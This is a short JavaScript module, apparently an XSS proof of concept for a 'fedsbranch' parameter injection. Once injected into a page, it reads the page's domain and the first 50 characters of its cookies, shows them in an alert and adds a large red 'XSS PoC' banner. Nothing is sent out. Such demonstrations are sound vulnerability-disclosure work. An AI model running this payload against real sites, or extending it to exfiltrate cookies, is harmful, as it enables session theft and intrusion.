export async function main(config) {
  const d = document.domain;
  const c = document.cookie.substring(0, 50);
  alert('XSS on ' + d + '\nCookie preview: ' + c);
  const el = document.createElement('div');
  el.style.cssText = 'position:fixed;top:0;left:0;right:0;background:red;color:white;padding:20px;z-index:999999;font-size:24px;text-align:center';
  el.textContent = 'XSS PoC - fedsbranch parameter injection on ' + d;
  document.body.prepend(el);
}
